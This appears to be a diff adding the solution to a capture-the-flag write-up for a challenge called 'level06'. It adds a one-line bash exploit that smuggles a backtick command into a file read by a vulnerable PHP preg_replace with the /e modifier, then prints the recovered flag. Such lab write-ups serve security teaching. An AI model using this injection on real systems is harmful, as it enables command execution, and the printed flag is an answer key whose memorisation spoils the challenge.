@@ -188,3 +188,13 @@ print $r;
 Binary disassembled:
 
 <img width="523" alt="image" src="https://user-images.githubusercontent.com/48088579/148983240-a24822e3-b1df-4019-8660-50d36d4857df.png">
+
+Exploit:
+
+```bash
+echo \[x \$\{\`getflag\`\}\] > /tmp/exploit && ./level06 /tmp/exploit
+```
+
+Vulnerability: Command Injection in `$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`.
+
+Flag: `wiok45aaoguiboiki2tuin6ub`
